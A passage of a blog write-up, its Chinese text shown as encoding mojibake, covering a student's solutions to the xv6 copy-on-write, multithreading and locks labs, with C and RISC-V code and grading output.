class="number">12</span>)]++;</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line">    <span class="keyword">if</span>(flags&amp;PTE_W)&#123;</span><br><span class="line">      *pte=(*pte)|PTE_COW;</span><br><span class="line">      *pte=(*pte)&amp;(~PTE_W);</span><br><span class="line">      flags=flags|PTE_COW;</span><br><span class="line">      flags=(flags&amp;(~PTE_W));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// flags = (PTE_FLAGS(*pte)&amp;(~PTE_W))|PTE_COW;</span></span><br><span class="line">    <span class="keyword">if</span>(mappages(<span class="keyword">new</span>, i, PGSIZE, (uint64)pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  err:</span></span><br><span class="line"><span class="comment">//   uvmunmap(new, 0, i / PGSIZE, 1);</span></span><br><span class="line"><span class="comment">//   return -1;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç»“æœ-2"><a href="#ç»“æœ-2" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><p>æ»¡åˆ†ï¼Œå¥½æ¬¸</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/xxv6/xv6-labs-2020$ ./grade-lab-cow </span><br><span class="line">make: â€œkernel/kernelâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">== Test running cowtest == (4.9s) </span><br><span class="line">== Test   simple == </span><br><span class="line">  simple: OK </span><br><span class="line">== Test   three == </span><br><span class="line">  three: OK </span><br><span class="line">== Test   file == </span><br><span class="line">  file: OK </span><br><span class="line">== Test usertests == (107.3s) </span><br><span class="line">    (Old xv6.out.usertests failure <span class="built_in">log</span> removed)</span><br><span class="line">== Test   usertests: copyin == </span><br><span class="line">  usertests: copyin: OK </span><br><span class="line">== Test   usertests: copyout == </span><br><span class="line">  usertests: copyout: OK </span><br><span class="line">== Test   usertests: all tests == </span><br><span class="line">  usertests: all tests: OK </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 110/110</span><br></pre></td></tr></table></figure>

<h2 id="Lab7-Multithreading"><a href="#Lab7-Multithreading" class="headerlink" title="Lab7: Multithreading"></a>Lab7: Multithreading</h2><h3 id="Uthread-switching-between-threads-moderate"><a href="#Uthread-switching-between-threads-moderate" class="headerlink" title="Uthread: switching between threads (moderate)"></a>Uthread: switching between threads (moderate)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> </span></span><br><span class="line"><span class="function"><span class="title">thread_create</span><span class="params">(<span class="keyword">void</span> (*func)())</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;state == FREE) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  t-&gt;state = RUNNABLE;</span><br><span class="line">  t-&gt;context.sp=(uint64)t-&gt;<span class="built_in">stack</span>+STACK_SIZE<span class="number">-1</span>;</span><br><span class="line">  t-&gt;context.ra=(uint64)func;</span><br><span class="line">  <span class="comment">// YOUR CODE HEREs</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (current_thread != next_thread) &#123;         <span class="comment">/* switch threads?  */</span></span><br><span class="line">    next_thread-&gt;state = RUNNING;</span><br><span class="line">    t = current_thread;</span><br><span class="line">    current_thread = next_thread;</span><br><span class="line">    <span class="comment">/* YOUR CODE HERE</span></span><br><span class="line"><span class="comment">     * Invoke thread_switch to switch from t to next_thread:</span></span><br><span class="line"><span class="comment">     * thread_switch(??, ??);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    thread_switch((uint64)&amp;(t-&gt;context),(uint64)&amp;(current_thread-&gt;context));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span>       <span class="built_in">stack</span>[STACK_SIZE]; <span class="comment">/* the thread&#x27;s stack */</span></span><br><span class="line">  <span class="keyword">int</span>        state;             <span class="comment">/* FREE, RUNNING, RUNNABLE */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">	.text</span><br><span class="line">	.globl thread_switch</span><br><span class="line">thread_switch:</span><br><span class="line">	sd ra, 0(a0)</span><br><span class="line">	sd sp, 8(a0)</span><br><span class="line">	sd s0, 16(a0)</span><br><span class="line">	sd s1, 24(a0)</span><br><span class="line">	sd s2, 32(a0)</span><br><span class="line">	sd s3, 40(a0)</span><br><span class="line">	sd s4, 48(a0)</span><br><span class="line">	sd s5, 56(a0)</span><br><span class="line">	sd s6, 64(a0)</span><br><span class="line">	sd s7, 72(a0)</span><br><span class="line">	sd s8, 80(a0)</span><br><span class="line">	sd s9, 88(a0)</span><br><span class="line">	sd s10, 96(a0)</span><br><span class="line">	sd s11, 104(a0)</span><br><span class="line"></span><br><span class="line">	ld ra, 0(a1)</span><br><span class="line">	ld sp, 8(a1)</span><br><span class="line">	ld s0, 16(a1)</span><br><span class="line">	ld s1, 24(a1)</span><br><span class="line">	ld s2, 32(a1)</span><br><span class="line">	ld s3, 40(a1)</span><br><span class="line">	ld s4, 48(a1)</span><br><span class="line">	ld s5, 56(a1)</span><br><span class="line">	ld s6, 64(a1)</span><br><span class="line">	ld s7, 72(a1)</span><br><span class="line">	ld s8, 80(a1)</span><br><span class="line">	ld s9, 88(a1)</span><br><span class="line">	ld s10, 96(a1)</span><br><span class="line">	ld s11, 104(a1)</span><br><span class="line">	ret    /* return to ra */</span><br></pre></td></tr></table></figure>

<p>åé¢ä¸¤ä¸ªå®éªŒå°±æ˜¯ç”¨æˆ·æ€çš„é”å’Œé‡Šæ”¾ï¼Œå°±ä¸æ”¾ä»£ç äº†</p>
<h3 id="ç»“æœ-3"><a href="#ç»“æœ-3" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">make: â€œkernel/kernelâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">== Test uthread == uthread: OK (0.9s) </span><br><span class="line">== Test answers-thread.txt == answers-thread.txt: OK </span><br><span class="line">== Test ph_safe == make: â€œphâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">ph_safe: OK (10.8s) </span><br><span class="line">== Test ph_fast == make: â€œphâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">ph_fast: OK (22.3s) </span><br><span class="line">== Test barrier == make: â€œbarrierâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">barrier: OK (11.1s) </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 60/60</span><br></pre></td></tr></table></figure>

<h2 id="Lab8-locks"><a href="#Lab8-locks" class="headerlink" title="Lab8: locks"></a>Lab8: locks</h2><h3 id="å®éªŒä¸€"><a href="#å®éªŒä¸€" class="headerlink" title="å®éªŒä¸€"></a>å®éªŒä¸€</h3><p>ä¸ºæ¯ä¸ªcpuå‡†å¤‡ä¸€ä¸ªç©ºé—²é˜Ÿåˆ—ï¼Œç„¶åæ¯ä¸ªcpuåœ¨è‡ªå·±çš„ç©ºé—²é˜Ÿåˆ—ä¸Šè·å¾—æ–°é¡µé¢ï¼Œç„¶åä¸ºæ¯ä¸ªç©ºé—²é˜Ÿåˆ—å‡†å¤‡ä¸€ä¸ªé”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;memlayout.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> end[]; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initlock(&amp;kmem[<span class="number">0</span>].lock, <span class="string">&quot;kmem0&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem[<span class="number">1</span>].lock, <span class="string">&quot;kmem1&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem[<span class="number">2</span>].lock, <span class="string">&quot;kmem2&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="keyword">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint32 keme_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pa : %p\n&quot;</span>,(uint64)pa);</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct run*)pa;</span><br><span class="line">  keme_id=(((uint64)pa)&gt;&gt;<span class="number">12</span>)%<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem[keme_id].lock);</span><br><span class="line">  r-&gt;next = kmem[keme_id].freelist;</span><br><span class="line">  kmem[keme_id].freelist = r;</span><br><span class="line">  release(&amp;kmem[keme_id].lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">get_other_freeelist_r</span><span class="params">(uint32 kmem_id)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  acquire(&amp;kmem[kmem_id].lock);</span><br><span class="line">  r = kmem[kmem_id].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem[kmem_id].freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem[kmem_id].lock);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *)r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint32 keme_id;</span><br><span class="line">  keme_id=cpuid();</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem[keme_id].lock);</span><br><span class="line">  r = kmem[keme_id].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem[keme_id].freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem[keme_id].lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!r)&#123;</span><br><span class="line">    r=get_other_freeelist_r((keme_id+<span class="number">1</span>)%<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span>(!r)&#123;</span><br><span class="line">      r=get_other_freeelist_r((keme_id+<span class="number">2</span>)%<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="å®éªŒäºŒ"><a href="#å®éªŒäºŒ" class="headerlink" title="å®éªŒäºŒ"></a>å®éªŒäºŒ</h3><p>åœ¨xv6æ“ä½œç³»ç»Ÿä¸­ï¼Œä¼šæœ‰ä¸€ä¸ªç¼“å†²åŒºåˆ—è¡¨æ¥è®°å½•ç£ç›˜å†…å®¹ï¼Œå½“è¯»ç£ç›˜çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šæŠŠå†…å®¹ç¼“å†²åˆ°è¿™ä¸ªç¼“å†²åŒºï¼Œç„¶åå†ä»è¿™ä¸ªç¼“å†²åŒºä¸­è¯»å–ä¿¡æ¯ï¼Œåˆšå¼€å§‹è¿™ä¸ªç¼“å†²åŒºå…¨éƒ¨æ”¾åœ¨ä¸€ä¸ªé“¾è¡¨ä¸­ç„¶åä½¿ç”¨ä¸€ä¸ªé”é˜²æ­¢ç«äº‰ï¼Œä½†æ˜¯ioååé‡æ¯”è¾ƒå¤§çš„æ—¶å€™æ˜¯æ¯”è¾ƒæµªè´¹cpuèµ„æºçš„ï¼Œæ‰€ä»¥å¾—è®©æ•°æ®ç»“æ„æ›´åŠ ç»†åŒ–ï¼Œé€‰æ‹©ä½¿ç”¨ä¸€ä¸ªæ¡¶ï¼ˆä½†æ„Ÿè§‰å’Œå“ˆå¸Œè¡¨æ²¡å•¥å·®åˆ«ï¼‰æ¥æ•´å¤šä¸ªé“¾è¡¨ï¼Œç„¶åæ¯ä¸ªé“¾è¡¨ä¸€ä¸ªé”æ¥ä¿æŠ¤ï¼Œè¿™æ ·æ—¢èƒ½é˜²æ­¢ç«äº‰ï¼Œåˆèƒ½æ›´åŠ çº¿ç¨‹åŒ–ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Bucket_size 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HASH(id) (id%13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;sleeplock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;buf.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">bucket</span>&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> <span class="title">buckets</span>[13];</span></span><br><span class="line">  </span><br><span class="line">&#125; bcache;</span><br><span class="line"><span class="keyword">char</span> lockname[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="keyword">char</span> b_lockname[<span class="number">30</span>][<span class="number">16</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">binit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(lockname,<span class="number">0</span>,<span class="keyword">sizeof</span>(lockname));</span><br><span class="line">  <span class="built_in">memset</span>(b_lockname,<span class="number">0</span>,<span class="keyword">sizeof</span>(b_lockname));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Bucket_size;i++)&#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(lockname[i],<span class="keyword">sizeof</span>(lockname),<span class="string">&quot;bcahce_%d&quot;</span>,i);</span><br><span class="line">    initlock(&amp;(bcache.buckets[i].lock),lockname[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Bucket_size;i++)&#123;</span><br><span class="line">    bcache.buckets[i].head.prev=&amp;bcache.buckets[i].head;</span><br><span class="line">    bcache.buckets[i].head.next=&amp;bcache.buckets[i].head;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(b = bcache.buf; b &lt; bcache.buf+NBUF; b++)&#123;</span><br><span class="line">    b-&gt;next = bcache.buckets[<span class="number">0</span>].head.next;</span><br><span class="line">    b-&gt;prev = &amp;bcache.buckets[<span class="number">0</span>].head;</span><br><span class="line">    <span class="built_in">snprintf</span>(b_lockname[i],<span class="keyword">sizeof</span>(b_lockname),<span class="string">&quot;buffer_%d&quot;</span>,i);</span><br><span class="line">    initsleeplock(&amp;b-&gt;lock,b_lockname[i]);</span><br><span class="line">    bcache.buckets[<span class="number">0</span>].head.next-&gt;prev = b;</span><br><span class="line">    bcache.buckets[<span class="number">0</span>].head.next = b;</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Look through buffer cache for block on device dev.</span></span><br><span class="line"><span class="comment">// If not found, allocate a buffer.</span></span><br><span class="line"><span class="comment">// In either case, return locked buffer.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct buf*</span></span><br><span class="line"><span 